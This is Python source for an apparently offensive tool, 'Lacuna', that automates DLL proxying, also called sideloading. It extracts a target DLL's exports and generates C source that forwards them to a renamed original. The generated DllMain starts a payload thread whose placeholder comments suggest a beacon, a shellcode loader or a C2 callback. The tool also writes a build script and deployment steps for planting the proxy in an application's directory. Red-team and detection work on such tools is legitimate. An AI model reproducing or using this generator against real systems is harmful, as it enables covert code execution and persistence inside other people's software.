"""Proxy DLL source code generator.

Given a target DLL, generates a full proxy DLL source that:
1. Forwards all exports to a renamed copy of the original
2. Runs attacker code in DllMain on DLL_PROCESS_ATTACH
3. Keeps the host application stable (all APIs pass through)
"""

from __future__ import annotations

import logging
import subprocess
from pathlib import Path

import pefile

log = logging.getLogger(__name__)

PROXY_TEMPLATE = r"""// Lacuna proxy DLL — {dll_name}
// Generated proxy for: {original_path}
// Forwards {export_count} exports to: {forward_dll_name}
//
// Setup:
//   1. Rename original {dll_name} -> {forward_dll_name}
//   2. Compile this as {dll_name}
//   3. Place both in the target directory

#include <windows.h>

// ===== Export forwarders =====
{pragma_lines}

// ===== Payload stub =====
// Replace this with your actual payload
void Payload(void) {{
    // PLACEHOLDER: Insert payload here
    // Examples:
    //   - CreateProcess("beacon.exe", ...)
    //   - Shellcode loader
    //   - Named pipe / C2 callback
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {{
    switch (dwReason) {{
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload, NULL, 0, NULL);
            break;
        case DLL_PROCESS_DETACH:
            break;
    }}
    return TRUE;
}}
"""

DEF_FILE_TEMPLATE = """LIBRARY {dll_name}
EXPORTS
{exports}
"""


def get_dll_exports(dll_path: Path) -> list[dict]:
    """Extract all exports from a DLL.

    Returns list of {name, ordinal, address, is_forwarded}
    """
    try:
        pe = pefile.PE(str(dll_path), fast_load=True)
        pe.parse_data_directories(
            directories=[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
        )
    except pefile.PEFormatError:
        log.error("Not a valid PE: %s", dll_path)
        return []

    exports = []
    if hasattr(pe, "DIRECTORY_ENTRY_EXPORT"):
        for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            name = exp.name.decode("utf-8", errors="replace") if exp.name else None
            exports.append({
                "name": name,
                "ordinal": exp.ordinal,
                "address": exp.address,
                "is_forwarded": exp.forwarder is not None,
                "forwarder": exp.forwarder.decode() if exp.forwarder else None,
            })
    pe.close()
    return exports


def get_exports_via_dumpbin(dll_path: Path) -> list[dict]:
    """Use dumpbin to extract exports (Windows, more reliable for some DLLs)."""
    try:
        result = subprocess.run(
            ["dumpbin", "/exports", str(dll_path)],
            capture_output=True,
            text=True,
            timeout=15,
        )
    except FileNotFoundError:
        return []

    exports = []
    in_export_section = False
    for line in result.stdout.split("\n"):
        line = line.strip()
        if "ordinal" in line and "hint" in line and "RVA" in line:
            in_export_section = True
            continue
        if in_export_section and line:
            parts = line.split()
            if len(parts) >= 4 and parts[0].isdigit():
                exports.append({
                    "ordinal": int(parts[0]),
                    "name": parts[-1] if not parts[-1].startswith("0x") else None,
                    "address": parts[2] if len(parts) > 2 else None,
                    "is_forwarded": "(forwarded" in line,
                })
            elif not parts[0].isdigit():
                in_export_section = False

    return exports


def generate_proxy_source(
    dll_path: Path,
    forward_dll_name: str | None = None,
) -> str:
    """Generate full proxy DLL source for a target DLL.

    Args:
        dll_path: Path to the original DLL to proxy
        forward_dll_name: Name for the renamed original (default: {stem}_orig.dll)
    """
    dll_name = dll_path.name
    stem = dll_path.stem

    if forward_dll_name is None:
        forward_dll_name = f"{stem}_orig.dll"

    forward_stem = forward_dll_name.replace(".dll", "").replace(".drv", "")

    # Get exports via pefile first, fall back to dumpbin
    exports = get_dll_exports(dll_path)
    if not exports:
        exports = get_exports_via_dumpbin(dll_path)

    if not exports:
        log.error("Could not extract exports from %s", dll_path)
        return ""

    # Generate pragma forwarder lines
    pragma_lines = []
    named_count = 0
    for exp in exports:
        if exp["name"]:
            pragma = (
                f'#pragma comment(linker, "/export:{exp["name"]}'
                f'={forward_stem}.{exp["name"]},@{exp["ordinal"]}")'
            )
            pragma_lines.append(pragma)
            named_count += 1
        else:
            # Ordinal-only export
            pragma = (
                f'#pragma comment(linker, "/export:#NO_NAME_ORD_{exp["ordinal"]}'
                f'={forward_stem}.#NO_NAME_ORD_{exp["ordinal"]},@{exp["ordinal"]},NONAME")'
            )
            pragma_lines.append(pragma)

    source = PROXY_TEMPLATE.format(
        dll_name=dll_name,
        original_path=str(dll_path),
        export_count=len(exports),
        forward_dll_name=forward_dll_name,
        pragma_lines="\n".join(pragma_lines),
    )

    log.info(
        "Generated proxy for %s: %d exports (%d named)",
        dll_name, len(exports), named_count,
    )
    return source


def generate_def_file(dll_path: Path, forward_dll_name: str | None = None) -> str:
    """Generate a .DEF file as alternative to pragma forwarding.

    Some compilers (mingw) prefer .DEF files over pragmas.
    """
    dll_name = dll_path.stem
    if forward_dll_name is None:
        forward_dll_name = f"{dll_name}_orig"
    else:
        forward_dll_name = forward_dll_name.replace(".dll", "").replace(".drv", "")

    exports = get_dll_exports(dll_path)
    if not exports:
        exports = get_exports_via_dumpbin(dll_path)

    lines = []
    for exp in exports:
        if exp["name"]:
            lines.append(f"    {exp['name']}={forward_dll_name}.{exp['name']} @{exp['ordinal']}")
        else:
            lines.append(
                f"    @{exp['ordinal']}={forward_dll_name}.@{exp['ordinal']} @{exp['ordinal']} NONAME"
            )

    return DEF_FILE_TEMPLATE.format(
        dll_name=dll_name,
        exports="\n".join(lines),
    )


def write_proxy_project(
    dll_path: Path,
    output_dir: Path,
    forward_dll_name: str | None = None,
) -> dict[str, Path]:
    """Write complete proxy DLL project to disk.

    Returns dict of generated file paths.
    """
    output_dir.mkdir(parents=True, exist_ok=True)

    dll_name = dll_path.name
    stem = dll_path.stem

    if forward_dll_name is None:
        forward_dll_name = f"{stem}_orig.dll"

    source = generate_proxy_source(dll_path, forward_dll_name)
    def_file = generate_def_file(dll_path, forward_dll_name)

    source_path = output_dir / f"{stem}_proxy.c"
    def_path = output_dir / f"{stem}_proxy.def"
    build_path = output_dir / "build.cmd"

    source_path.write_text(source)
    def_path.write_text(def_file)

    # Generate build script
    build_script = f"""@echo off
REM Lacuna proxy build script for {dll_name}
REM Requires: Visual Studio Developer Command Prompt or mingw

REM === MSVC build ===
REM cl /LD /Fe:{dll_name} {stem}_proxy.c /link /DEF:{stem}_proxy.def

REM === MinGW build (x64) ===
x86_64-w64-mingw32-gcc -shared -o {dll_name} {stem}_proxy.c -Wl,--enable-stdcall-fixup

REM === Deployment ===
REM 1. Copy original {dll_name} to {forward_dll_name}
REM 2. Replace original with compiled proxy
REM 3. Both files must be in the target application's directory
"""
    build_path.write_text(build_script)

    readme_path = output_dir / "DEPLOY.txt"
    readme_path.write_text(
        f"Lacuna Proxy — {dll_name}\n"
        f"{'=' * 40}\n\n"
        f"Target DLL: {dll_path}\n"
        f"Forward to: {forward_dll_name}\n"
        f"Exports: {len(get_dll_exports(dll_path))}\n\n"
        f"Deployment:\n"
        f"  1. Rename {dll_name} -> {forward_dll_name} in the app directory\n"
        f"  2. Compile and place proxy as {dll_name}\n"
        f"  3. Trigger the host application\n"
        f"  4. Payload executes in DllMain thread\n"
    )

    return {
        "source": source_path,
        "def": def_path,
        "build": build_path,
        "readme": readme_path,
    }
